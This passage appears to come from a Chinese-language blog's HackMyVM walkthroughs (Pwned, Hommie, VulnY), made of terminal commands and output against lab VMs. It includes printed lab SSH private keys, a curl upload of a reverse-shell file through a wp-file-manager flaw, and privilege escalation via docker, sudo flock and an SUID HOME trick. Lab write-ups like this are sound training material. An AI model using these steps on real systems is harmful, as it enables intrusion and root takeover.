class=\"line\">W02Xd7eJt3dnFH+hdy5B9dD+jTmRsMkwjeE4vLLaSToVUVl8qWQy2vD6NdS3bdyTXWQWoU</span><br><span class=\"line\">1da3c1FYajXHvQlra6yUjALVLVK8ex4xNlrG86zFRfsc1h2CjqjRqrkt0zJr+Sl3bGk+v6</span><br><span class=\"line\">1DOp1QYfdD1r1IhFpxRlTt32DFcfzBs+tIfreoNSakDLSFBK/G0gQ7acfH4uM9XbBRAAAA</span><br><span class=\"line\">wQC1LMyX0BKA/X0EWZZWjDtbNoS72sTlruffheQ9AiaT+fmbbAwwh2bMOuT5OOZXEH4bQi</span><br><span class=\"line\">B7H5D6uAwhbVTtBLBrOc5xKOOKTcUabEpXJjif+WSK3T1Sd00hJUnNsesIM+GgdDhjXbfx</span><br><span class=\"line\">WY9c2ADpYcD/1g+J5RRHBFr3qdxMPi0zeDZE9052VnJ+WdYzK/5O3TT+8Bi7xVCAZUuQ1K</span><br><span class=\"line\">EcP3XLUrGVM6Usls4DEMJnd1blXAIcwQkAqGqwAHHuxgBIq64AAADBAN0/SEFZ9dGAn0tA</span><br><span class=\"line\">Qsi44wFrozyYmr5OcOd6JtK9UFVqYCgpzfxwDnC+5il1jXgocsf8iFEgBLIvmmtc7dDZKK</span><br><span class=\"line\">mCup9kY+fhR8wDaTgohGPWC6gO/obPD5DE7Omzrel56DaPwB7kdgxQH4aKy9rnjkgwlMa0</span><br><span class=\"line\">hPAK+PN4NfLCDZbnPbhXRSYD+91b4PFPgfSXR06nVCKQ7KR0/2mtD7UR07n/sg2YsMeCzv</span><br><span class=\"line\">m9kzzd64fbqGKEsRAUQJOCcgmKG2Zq3wAAAMEA0rRybJr61RaHlPJMTdjPanh/guzWhM/C</span><br><span class=\"line\">b0HDZLGU9lSEFMMAI+NPWlv9ydQcth6PJRr/w+0t4IVSKClLRBhbUJnB8kCjMKu56RVMkm</span><br><span class=\"line\">j6dQj+JUdPf4pvoUsfymhT98BhF9gUB2K+B/7srQ5NU2yNOV4e9uDmieH6jFY8hRo7RRCo</span><br><span class=\"line\">N71H6gMon74vcdSYpg3EbqocEeUN4ZOq23Bc5R64TLu2mnOrHvOlcMzUq9ydAAufgHSsbY</span><br><span class=\"line\">GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat note.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Wow you are here</span><br><span class=\"line\"></span><br><span class=\"line\">ariana won&#x27;t happy about this note</span><br><span class=\"line\"></span><br><span class=\"line\">sorry ariana :(</span><br></pre></td></tr></table></figure>\n\n<p>给了ssh的私钥和用户名,给id_rsa文件600的权限然后登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ssh ariana@192.168.31.51 -i id_rsa</span><br><span class=\"line\">The authenticity of host &#x27;192.168.31.51 (192.168.31.51)&#x27; can&#x27;t be established.</span><br><span class=\"line\">ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.</span><br><span class=\"line\">This key is not known by any other names.</span><br><span class=\"line\">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class=\"line\">Warning: Permanently added &#x27;192.168.31.51&#x27; (ED25519) to the list of known hosts.</span><br><span class=\"line\">Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">The programs included with the Debian GNU/Linux system are free software;</span><br><span class=\"line\">the exact distribution terms for each program are described in the</span><br><span class=\"line\">individual files in /usr/share/doc/*/copyright.</span><br><span class=\"line\"></span><br><span class=\"line\">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class=\"line\">permitted by applicable law.</span><br><span class=\"line\">Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70</span><br><span class=\"line\">ariana@pwned:~$ ls</span><br><span class=\"line\">ariana-personal.diary  user1.txt</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ariana@pwned:/$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for ariana on pwned:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User ariana may run the following commands on pwned:</span><br><span class=\"line\">    (selena) NOPASSWD: /home/messenger.sh</span><br></pre></td></tr></table></figure>\n\n<p>可以以selena用户，无密码运行/home/messenger.sh</p>\n<p>messenger.sh的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ariana@pwned:/home$ cat messenger.sh</span><br><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">clear</span><br><span class=\"line\">echo &quot;Welcome to linux.messenger &quot;</span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">echo &quot;$users&quot;</span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">read -p &quot;Enter username to send message : &quot; name</span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">read -p &quot;Enter message for $name :&quot; msg</span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">echo &quot;Sending message to $name &quot;</span><br><span class=\"line\"></span><br><span class=\"line\">$msg 2&gt; /dev/null</span><br><span class=\"line\"></span><br><span class=\"line\">                echo &quot;&quot;</span><br><span class=\"line\">echo &quot;Message sent to $name :) &quot;</span><br><span class=\"line\">                echo &quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>直接sudo运行可以提权到selena，然后用python获取伪终端</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ariana@pwned:/home$ sudo -u selena /home/messenger.sh</span><br><span class=\"line\">Welcome to linux.messenger</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ariana:</span><br><span class=\"line\">selena:</span><br><span class=\"line\">ftpuser:</span><br><span class=\"line\"></span><br><span class=\"line\">Enter username to send message : selena</span><br><span class=\"line\"></span><br><span class=\"line\">Enter message for selena :bash</span><br><span class=\"line\"></span><br><span class=\"line\">Sending message to selena</span><br><span class=\"line\">id</span><br><span class=\"line\">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class=\"line\">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">selena@pwned:/home$</span><br></pre></td></tr></table></figure>\n\n<p>selena的主目录下有一个user2.txt</p>\n<p>通过id能看到用户在docker组里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">selena@pwned:/$ id</span><br><span class=\"line\">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">selena@pwned:/$ docker images</span><br><span class=\"line\">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class=\"line\">privesc             latest              09ae39f0f8fc        4 years ago         88.3MB</span><br><span class=\"line\">&lt;none&gt;              &lt;none&gt;              e13ad046d435        4 years ago         88.3MB</span><br><span class=\"line\">alpine              latest              a24bb4013296        4 years ago         5.57MB</span><br><span class=\"line\">debian              wheezy              10fcec6d95c4        5 years ago         88.3MB</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://gtfobins.github.io/gtfobins/docker/\">docker提权</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">selena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class=\"line\">id</span><br><span class=\"line\"># uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span><br></pre></td></tr></table></figure>\n\n<p>提权成功</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限；用户在docker组里就可以免sudo运行docker，而容器内默认是root用户，用-v选项将用户外的目录映射到容器内既可以以root用户去修改文件</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Hommie","url":"/2025/01/23/HackmyVM-Hommie/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.116  08:00:27:26:b1:6f       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.116，nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.116 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 EST</span><br><span class=\"line\">Nmap scan report for hommie (192.168.31.116)</span><br><span class=\"line\">Host is up (0.00041s latency).</span><br><span class=\"line\">Not shown: 65532 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">21/tcp open  ftp</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl 192.168.31.116</span><br><span class=\"line\">alexia, Your id_rsa is exposed, please move it!!!!!</span><br><span class=\"line\">Im fighting regarding reverse shells!</span><br><span class=\"line\">-nobody</span><br></pre></td></tr></table></figure>\n\n<p>80端口目录也扫描不到，只给了一个提示，alexia的id_rsa泄露了，去看21端口</p>\n<h1 id=\"21端口\"><a href=\"#21端口\" class=\"headerlink\" title=\"21端口\"></a>21端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ftp anonymous@192.168.31.116</span><br><span class=\"line\">Connected to 192.168.31.116.</span><br><span class=\"line\">220 (vsFTPd 3.0.3)</span><br><span class=\"line\">331 Please specify the password.</span><br><span class=\"line\">Password:</span><br><span class=\"line\">230 Login successful.</span><br><span class=\"line\">Remote system type is UNIX.</span><br><span class=\"line\">Using binary mode to transfer files.</span><br><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||35772|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class=\"line\">226 Directory send OK.</span><br><span class=\"line\">ftp&gt; ls -al</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||35347|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxr-xr-x    3 0        113          4096 Sep 30  2020 .</span><br><span class=\"line\">drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..</span><br><span class=\"line\">drwxrwxr-x    2 0        113          4096 Jan 23 06:12 .web</span><br><span class=\"line\">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class=\"line\">226 Directory send OK.</span><br><span class=\"line\">ftp&gt; cd .web</span><br><span class=\"line\">250 Directory successfully changed.</span><br><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||27864|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">-rw-r--r--    1 106      113            35 Jan 23 06:12 1.phtml</span><br><span class=\"line\">-rw-r--r--    1 0        0              99 Sep 30  2020 index.html</span><br><span class=\"line\">-rw-r--r--    1 106      113          5493 Jan 23 06:09 rev.php</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>21端口有匿名登录，存在.web目录，可以往80端口传文件，但是不解析php，只能放弃</p>\n<h1 id=\"tftp\"><a href=\"#tftp\" class=\"headerlink\" title=\"tftp\"></a>tftp</h1><p>扫描udp端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 EST</span><br><span class=\"line\">Nmap scan report for hommie (192.168.31.116)</span><br><span class=\"line\">Host is up (0.00053s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT      STATE         SERVICE</span><br><span class=\"line\">53/udp    closed        domain</span><br><span class=\"line\">67/udp    open|filtered dhcps</span><br><span class=\"line\">68/udp    open|filtered dhcpc</span><br><span class=\"line\">69/udp    open|filtered tftp</span><br><span class=\"line\">123/udp   open|filtered ntp</span><br><span class=\"line\">135/udp   closed        msrpc</span><br><span class=\"line\">137/udp   open|filtered netbios-ns</span><br><span class=\"line\">138/udp   open|filtered netbios-dgm</span><br><span class=\"line\">139/udp   open|filtered netbios-ssn</span><br><span class=\"line\">161/udp   closed        snmp</span><br><span class=\"line\">162/udp   open|filtered snmptrap</span><br><span class=\"line\">445/udp   open|filtered microsoft-ds</span><br><span class=\"line\">500/udp   open|filtered isakmp</span><br><span class=\"line\">514/udp   closed        syslog</span><br><span class=\"line\">520/udp   open|filtered route</span><br><span class=\"line\">631/udp   open|filtered ipp</span><br><span class=\"line\">1434/udp  open|filtered ms-sql-m</span><br><span class=\"line\">1900/udp  open|filtered upnp</span><br><span class=\"line\">4500/udp  open|filtered nat-t-ike</span><br><span class=\"line\">49152/udp open|filtered unknown</span><br><span class=\"line\">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds</span><br></pre></td></tr></table></figure>\n\n<p>tftp的服务开着，结合80端口给的提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# tftp 192.168.31.116</span><br><span class=\"line\">tftp&gt; get id_rsa</span><br></pre></td></tr></table></figure>\n\n<p>可以下载下来alexia的id_rsa</p>\n<p>ssh登录</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>找有suid的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\">/opt/showMetheKey</span><br><span class=\"line\">/usr/lib/openssh/ssh-keysign</span><br><span class=\"line\">/usr/lib/eject/dmcrypt-get-device</span><br><span class=\"line\">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class=\"line\">/usr/bin/gpasswd</span><br><span class=\"line\">/usr/bin/chfn</span><br><span class=\"line\">/usr/bin/su</span><br><span class=\"line\">/usr/bin/mount</span><br><span class=\"line\">/usr/bin/chsh</span><br><span class=\"line\">/usr/bin/passwd</span><br><span class=\"line\">/usr/bin/newgrp</span><br><span class=\"line\">/usr/bin/umount</span><br></pre></td></tr></table></figure>\n\n<p><code>/opt/showMetheKey</code>很可疑啊,运行一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7</span><br><span class=\"line\">V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y</span><br><span class=\"line\">Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT</span><br><span class=\"line\">gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j</span><br><span class=\"line\">QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq</span><br><span class=\"line\">kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI</span><br><span class=\"line\">M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM</span><br><span class=\"line\">dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW</span><br><span class=\"line\">rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B</span><br><span class=\"line\">tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T</span><br><span class=\"line\">d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/</span><br><span class=\"line\">+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE</span><br><span class=\"line\">Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w</span><br><span class=\"line\">pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk</span><br><span class=\"line\">WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz</span><br><span class=\"line\">bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu</span><br><span class=\"line\">3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6</span><br><span class=\"line\">0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z</span><br><span class=\"line\">HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs</span><br><span class=\"line\">y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY</span><br><span class=\"line\">OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08</span><br><span class=\"line\">QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp</span><br><span class=\"line\">ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN</span><br><span class=\"line\">0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>把alexia的id_rsa输出了，将这个二进制文件拖下来放进ida看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setuid(0);</span><br><span class=\"line\">  setgid(0);</span><br><span class=\"line\">  system(&quot;cat $HOME/.ssh/id_rsa&quot;);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>他是查看环境变量里HOME变量下的.ssh/id_rsa,可以修改HOME变量读取root的id_rsa</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alexia@MiWiFi-RA71-srv:~$ export HOME=/root</span><br><span class=\"line\">alexia@MiWiFi-RA71-srv:/home/alexia$ env</span><br><span class=\"line\">SHELL=/bin/bash</span><br><span class=\"line\">PWD=/home/alexia</span><br><span class=\"line\">LOGNAME=alexia</span><br><span class=\"line\">XDG_SESSION_TYPE=tty</span><br><span class=\"line\">HOME=/root</span><br></pre></td></tr></table></figure>\n\n<p>再次运行拿到root的id_rsa，登录即可</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-VulnY","url":"/2025/01/24/HackmyVM-VulnY/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.165  08:00:27:6c:16:9b       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\"></span><br><span class=\"line\">4 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.165 ，nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.165 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 00:19 EST</span><br><span class=\"line\">Nmap scan report for vulny (192.168.31.165)</span><br><span class=\"line\">Host is up (0.049s latency).</span><br><span class=\"line\">Not shown: 65533 closed tcp ports (reset)</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">80/tcp    open  http</span><br><span class=\"line\">33060/tcp open  mysqlx</span><br><span class=\"line\">MAC Address: 08:00:27:6C:16:9B (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds</span><br></pre></td></tr></table></figure>\n\n<p>开了一个mysql服务和http的服务</p>\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><p>扫描目录能扫出来有一个secret的目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl http://192.168.31.165/secret/</span><br><span class=\"line\">Neither &lt;b&gt;/etc/wordpress/config-192.168.31.165.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.31.165.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username</span><br></pre></td></tr></table></figure>\n\n<p>提示了要去看/etc/wordpress/config-168.31.165.php，可以看出来这是一个wordpress的框架，wp-content存在目录遍历</p>\n<p>在<code>Index of /secret/wp-content/uploads/2020/10</code>这里能发现一个压缩包wp-file-manager-6.O.zip，这个插件存在任意文件上传</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -F cmd=upload -F target=l1_ -F upload[]=@rev.php -XPOST &quot;http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span><br></pre></td></tr></table></figure>\n\n<p>上传一个反弹shell的文件</p>\n<p>访问<a href=\"http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php\">http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php</a></p>\n<p>进行反弹shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ id</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>cd进/etc/wordpress，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@vulny:/etc/wordpress$ ls</span><br><span class=\"line\">ls</span><br><span class=\"line\">config-192.168.1.122.php  htaccess</span><br></pre></td></tr></table></figure>\n\n<p>文件名和80端口的不一样，猜测可能是80端口是ip地址输出的文件名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@vulny:/etc/wordpress$ cat c*</span><br><span class=\"line\">cat c*</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);</span><br><span class=\"line\">define(&#x27;DB_USER&#x27;, &#x27;wordpress&#x27;);</span><br><span class=\"line\">define(&#x27;DB_PASSWORD&#x27;, &#x27;myfuckingpassword&#x27;);</span><br><span class=\"line\">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br><span class=\"line\">define(&#x27;DB_COLLATE&#x27;, &#x27;utf8_general_ci&#x27;);</span><br><span class=\"line\">define(&#x27;WP_CONTENT_DIR&#x27;, &#x27;/usr/share/wordpress/wp-content&#x27;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>给了mysql的账号密码，这还有wordpress的路径，查看wp-config.php有一行注释很突出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/* idrinksomewater */</span><br></pre></td></tr></table></figure>\n\n<p>登录mysql，找不到有用的东西</p>\n<p>查看/etc/passwd有一个adrian可以登录，注释就是密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@vulny:/usr/share/wordpress$ su adrian</span><br><span class=\"line\">su adrian</span><br><span class=\"line\">Password: idrinksomewater</span><br><span class=\"line\"></span><br><span class=\"line\">adrian@vulny:/usr/share/wordpress$</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adrian@vulny:/$ sudo -l</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for adrian on vulny:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User adrian may run the following commands on vulny:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adrian@vulny:/$ sudo -u root /usr/bin/flock -u / /bin/bash</span><br><span class=\"line\">sudo -u root /usr/bin/flock -u / /bin/bash</span><br><span class=\"line\">root@vulny:/</span><br></pre></td></tr></table></figure>\n\n<p>提权成功</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Helium","url":"/2025/01/26/HackmyVM-Helium/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" 